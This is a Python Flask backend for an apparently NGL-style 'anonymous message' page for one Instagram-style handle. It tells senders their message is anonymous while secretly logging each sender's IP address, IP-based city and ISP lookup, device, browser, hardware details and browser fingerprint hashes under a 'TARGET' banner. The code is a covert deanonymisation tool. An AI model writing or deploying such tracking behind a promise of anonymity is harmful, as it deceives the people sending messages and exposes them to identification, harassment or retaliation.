from collections import defaultdict, deque
from datetime import datetime
from hashlib import sha256
from ipaddress import ip_address
from threading import Lock
from time import monotonic
from zoneinfo import ZoneInfo
import json
import logging

import requests
from flask import Flask, request
from flask_cors import CORS
from user_agents import parse
from werkzeug.middleware.proxy_fix import ProxyFix


# -----------------------------------------------------------------------------
# App configuration
# -----------------------------------------------------------------------------

app = Flask(__name__)

# Render sits in front of the Gunicorn/Flask process. Trust one proxy hop for
# client IP + scheme. If you later put another proxy/CDN in front of Render,
# revisit these values rather than simply increasing them blindly.
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1)

# IMPORTANT: if your GitHub Pages origin is different, change only this line.
FRONTEND_ORIGIN = "https://vaibhav-w16.github.io"
CORS(
    app,
    resources={r"/submit": {"origins": [FRONTEND_ORIGIN]}},
    supports_credentials=False,
)

# Requested limit: 20 submissions per minute per client IP.
RATE_LIMIT_REQUESTS = 20
RATE_LIMIT_WINDOW_SECONDS = 60

# Cache IP lookups so repeated messages from one visitor do not repeatedly call
# the external API. This also helps stay below ip-api.com's free rate limit.
NETWORK_CACHE_TTL_SECONDS = 6 * 60 * 60
NETWORK_CACHE_MAX_ENTRIES = 1024

IST = ZoneInfo("Asia/Kolkata")

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
)
logger = logging.getLogger("ngl_backend")

# Small in-memory stores are enough for this single-process learning project.
# If you later run multiple Gunicorn workers/instances, use a shared store such
# as Redis for rate limiting and caching.
_rate_buckets = defaultdict(deque)
_rate_lock = Lock()
_network_cache = {}
_network_cache_lock = Lock()
_ip_api_blocked_until = 0.0
_ip_api_lock = Lock()

SUCCESS_PAGE = """
<div style="background: white; padding: 40px; border-radius: 35px; text-align: center; font-family: sans-serif;">
    <h1 style="color: #FE2F78;">✅ Sent!</h1>
    <p style="color: #666;">Your anonymous message has been delivered to @vaibhav_w16</p>
</div>
"""


# -----------------------------------------------------------------------------
# Validation / sanitizing helpers
# -----------------------------------------------------------------------------

def clean_form_field(name, max_length, default="Unknown"):
    """Read a form field, trim it, and enforce a small sane size."""
    value = request.form.get(name, "")
    if not isinstance(value, str):
        return default

    value = value.strip()
    if not value:
        return default

    return value[:max_length]


def clean_header(name, max_length=500, default="Unknown"):
    """Read and cap a request header before it is logged or fingerprinted."""
    value = request.headers.get(name, "").strip()
    return value[:max_length] if value else default


def safe_log_text(value):
    """Keep untrusted text on one physical log line."""
    return str(value).replace("\r", "\\r").replace("\n", "\\n")


def validate_message():
    msg = request.form.get("message", "")
    if not isinstance(msg, str):
        raise ValueError("Invalid message.")

    msg = msg.strip()
    if not msg:
        raise ValueError("Message is required.")
    if len(msg) > 300:
        raise ValueError("Message must be 300 characters or fewer.")

    return msg


def get_device_fields():
    """Validate the hardware fields already sent by the existing frontend."""
    ram = clean_form_field("ram", 20)
    ram_display = f"{ram} GB" if ram != "Unknown" else "Unknown"

    return {
        "gpu": clean_form_field("gpu", 300),
        "resolution": clean_form_field("res", 50),
        "ram": ram,
        "ram_display": ram_display,
        "cores": clean_form_field("cores", 20),
    }


# -----------------------------------------------------------------------------
# Client / fingerprint helpers
# -----------------------------------------------------------------------------

def get_client_ip():
    """Use REMOTE_ADDR after ProxyFix has handled the trusted proxy hop."""
    raw_ip = (request.remote_addr or "").strip()
    if not raw_ip:
        return "Unknown"

    try:
        return str(ip_address(raw_ip))
    except ValueError:
        logger.warning("Invalid client IP after proxy processing: %r", raw_ip)
        return "Unknown"


def parse_user_agent():
    ua_string = clean_header("User-Agent", 1000, default="")
    parsed = parse(ua_string)

    brand = parsed.device.brand or ""
    model = parsed.device.model or parsed.device.family or "PC/Mac"
    device_name = " ".join(part for part in (brand, model) if part).strip() or "Unknown"

    os_name = parsed.os.family or "Unknown"
    os_version = parsed.os.version_string or ""
    os_info = f"{os_name} {os_version}".strip()

    browser_name = parsed.browser.family or "Unknown"
    browser_version = parsed.browser.version_string or ""
    browser_info = f"{browser_name} {browser_version}".strip()

    return {
        "raw": ua_string or "Unknown",
        "device": device_name,
        "os": os_info,
        "browser": browser_info,
    }


def get_browser_signals():
    """Collect useful headers browsers may send automatically.

    These require no frontend changes. Availability varies by browser and
    privacy settings, so missing values are expected.
    """
    return {
        "accept_language": clean_header("Accept-Language", 300),
        "accept_encoding": clean_header("Accept-Encoding", 200),
        "sec_ch_ua": clean_header("Sec-CH-UA", 500),
        "sec_ch_ua_mobile": clean_header("Sec-CH-UA-Mobile", 50),
        "sec_ch_ua_platform": clean_header("Sec-CH-UA-Platform", 100),
        "dnt": clean_header("DNT", 20),
        "gpc": clean_header("Sec-GPC", 20),
    }


def _fingerprint_hash(material):
    canonical = json.dumps(
        material,
        sort_keys=True,
        separators=(",", ":"),
        ensure_ascii=False,
    )
    return sha256(canonical.encode("utf-8")).hexdigest()[:24]


def build_fingerprints(ip, ua, device, browser_signals):
    """Create deterministic heuristic IDs from available characteristics.

    stable_id uses slower-changing hardware/platform signals and excludes the
    IP and raw browser version. full_id adds more browser/header entropy for
    stronger differentiation. network_id combines the full fingerprint with
    the current IP.

    These are heuristic fingerprints, not guaranteed unique identifiers.
    """
    stable_material = {
        "gpu": device["gpu"],
        "resolution": device["resolution"],
        "ram": device["ram"],
        "cores": device["cores"],
        "accept_language": browser_signals["accept_language"],
        "sec_ch_ua_mobile": browser_signals["sec_ch_ua_mobile"],
        "sec_ch_ua_platform": browser_signals["sec_ch_ua_platform"],
    }

    full_material = {
        **stable_material,
        "ua": ua["raw"],
        "accept_encoding": browser_signals["accept_encoding"],
        "sec_ch_ua": browser_signals["sec_ch_ua"],
        "dnt": browser_signals["dnt"],
        "gpc": browser_signals["gpc"],
    }

    stable_id = _fingerprint_hash(stable_material)
    full_id = _fingerprint_hash(full_material)
    network_id = sha256(f"{ip}|{full_id}".encode("utf-8")).hexdigest()[:24]

    return stable_id, full_id, network_id


# -----------------------------------------------------------------------------
# Rate limiting
# -----------------------------------------------------------------------------

def is_rate_limited(ip):
    """Simple in-memory sliding-window limiter: 20 requests / 60 seconds / IP."""
    now = monotonic()
    cutoff = now - RATE_LIMIT_WINDOW_SECONDS

    with _rate_lock:
        bucket = _rate_buckets[ip]
        while bucket and bucket[0] <= cutoff:
            bucket.popleft()

        if len(bucket) >= RATE_LIMIT_REQUESTS:
            return True

        bucket.append(now)
        return False


# -----------------------------------------------------------------------------
# Network lookup
# -----------------------------------------------------------------------------

def _get_cached_network(ip):
    now = monotonic()
    with _network_cache_lock:
        cached = _network_cache.get(ip)
        if not cached:
            return None

        expires_at, data = cached
        if expires_at <= now:
            _network_cache.pop(ip, None)
            return None

        return data


def _cache_network(ip, data):
    now = monotonic()
    with _network_cache_lock:
        # Simple bounded cache; discard the oldest-expiring entry if necessary.
        if len(_network_cache) >= NETWORK_CACHE_MAX_ENTRIES and ip not in _network_cache:
            oldest_key = min(_network_cache, key=lambda key: _network_cache[key][0])
            _network_cache.pop(oldest_key, None)

        _network_cache[ip] = (now + NETWORK_CACHE_TTL_SECONDS, data)


def lookup_network(ip):
    """Look up coarse network metadata for a public IP with caching/fallbacks."""
    global _ip_api_blocked_until

    fallback = {
        "isp": "Unknown",
        "org": "Unknown",
        "asn": "Unknown",
        "asname": "Unknown",
        "city": "Unknown",
        "region": "Unknown",
        "country": "Unknown",
        "timezone": "Unknown",
        "mobile": "Unknown",
        "proxy": "Unknown",
        "hosting": "Unknown",
    }

    if ip == "Unknown":
        return fallback

    try:
        parsed_ip = ip_address(ip)
        if not parsed_ip.is_global:
            return {**fallback, "isp": "Local/Reserved IP"}
    except ValueError:
        return fallback

    cached = _get_cached_network(ip)
    if cached:
        return cached

    now = monotonic()
    with _ip_api_lock:
        if now < _ip_api_blocked_until:
            return {**fallback, "isp": "Lookup temporarily rate-limited"}

    try:
        response = requests.get(
            f"http://ip-api.com/json/{ip}",
            params={
                "fields": (
                    "status,message,query,isp,org,as,asname,city,regionName,"
                    "country,timezone,mobile,proxy,hosting"
                )
            },
            timeout=3,
        )
        response.raise_for_status()
        payload = response.json()

        # Respect the provider's own remaining-request headers.
        remaining = response.headers.get("X-Rl")
        if remaining == "0":
            try:
                ttl = max(1, int(response.headers.get("X-Ttl", "60")))
            except ValueError:
                ttl = 60
            with _ip_api_lock:
                _ip_api_blocked_until = monotonic() + ttl

        if payload.get("status") != "success":
            logger.warning(
                "IP lookup failed for %s: %s",
                ip,
                payload.get("message", "unknown error"),
            )
            return fallback

        data = {
            "isp": payload.get("isp") or "Unknown",
            "org": payload.get("org") or "Unknown",
            "asn": payload.get("as") or "Unknown",
            "asname": payload.get("asname") or "Unknown",
            "city": payload.get("city") or "Unknown",
            "region": payload.get("regionName") or "Unknown",
            "country": payload.get("country") or "Unknown",
            "timezone": payload.get("timezone") or "Unknown",
            "mobile": payload.get("mobile", "Unknown"),
            "proxy": payload.get("proxy", "Unknown"),
            "hosting": payload.get("hosting", "Unknown"),
        }
        _cache_network(ip, data)
        return data

    except (requests.RequestException, ValueError) as exc:
        logger.warning("Network lookup error for %s: %s", ip, exc)
        return fallback


# -----------------------------------------------------------------------------
# Logging
# -----------------------------------------------------------------------------

def log_submission(msg, ip, network, ua, device, browser_signals, stable_id, full_id, network_id):
    timestamp = datetime.now(IST).isoformat(timespec="seconds")

    network_location = " | ".join(
        safe_log_text(value)
        for value in (
            network["isp"],
            network["city"],
            network["region"],
            network["country"],
        )
    )

    report = (
        f"\n{'#' * 72}\n"
        f"🎯 TARGET: @vaibhav_w16 | {timestamp} IST\n"
        f"💬 MSG: {safe_log_text(msg)}\n"
        f"🧬 STABLE FP: {stable_id}\n"
        f"🔬 FULL FP: {full_id}\n"
        f"🔗 NETWORK FP: {network_id}\n"
        f"🌍 IP: {safe_log_text(ip)}\n"
        f"📱 DEVICE: {safe_log_text(ua['device'])} ({safe_log_text(ua['os'])})\n"
        f"🌐 BROWSER: {safe_log_text(ua['browser'])}\n"
        f"📡 NET: {network_location}\n"
        f"🏢 ASN/ORG: {safe_log_text(network['asn'])} | {safe_log_text(network['asname'])} | {safe_log_text(network['org'])}\n"
        f"🛰️ NET FLAGS: mobile={network['mobile']} | proxy={network['proxy']} | hosting={network['hosting']} | tz={safe_log_text(network['timezone'])}\n"
        f"⚙️ HW: GPU:{safe_log_text(device['gpu'])} | RAM:{safe_log_text(device['ram_display'])} | CPU:{safe_log_text(device['cores'])} | RES:{safe_log_text(device['resolution'])}\n"
        f"🧩 CH: UA={safe_log_text(browser_signals['sec_ch_ua'])} | PLATFORM={safe_log_text(browser_signals['sec_ch_ua_platform'])} | MOBILE={safe_log_text(browser_signals['sec_ch_ua_mobile'])}\n"
        f"🗣️ LANG: {safe_log_text(browser_signals['accept_language'])}\n"
        f"📦 ENCODING: {safe_log_text(browser_signals['accept_encoding'])}\n"
        f"🛡️ PRIVACY: DNT={safe_log_text(browser_signals['dnt'])} | GPC={safe_log_text(browser_signals['gpc'])}\n"
        f"{'#' * 72}"
    )

    logger.info("%s", report)


# -----------------------------------------------------------------------------
# Routes
# -----------------------------------------------------------------------------

@app.route("/")
def home():
    return "NGL Backend for @vaibhav_w16 is ONLINE.", 200


@app.route("/submit", methods=["POST"])
def submit():
    try:
        ip = get_client_ip()

        if is_rate_limited(ip):
            logger.warning("Rate limit reached for IP %s", ip)
            return "Too many requests", 429

        msg = validate_message()
        device = get_device_fields()
        ua = parse_user_agent()
        browser_signals = get_browser_signals()
        network = lookup_network(ip)

        stable_id, full_id, network_id = build_fingerprints(
            ip=ip,
            ua=ua,
            device=device,
            browser_signals=browser_signals,
        )

        log_submission(
            msg=msg,
            ip=ip,
            network=network,
            ua=ua,
            device=device,
            browser_signals=browser_signals,
            stable_id=stable_id,
            full_id=full_id,
            network_id=network_id,
        )

        # Keep the existing response behavior so index.html does not need changes.
        return SUCCESS_PAGE, 200

    except ValueError as exc:
        logger.info("Rejected submission: %s", exc)
        return str(exc), 400
    except Exception:
        logger.exception("Unexpected error while processing submission")
        return "Internal Error", 500


if __name__ == "__main__":
    app.run()
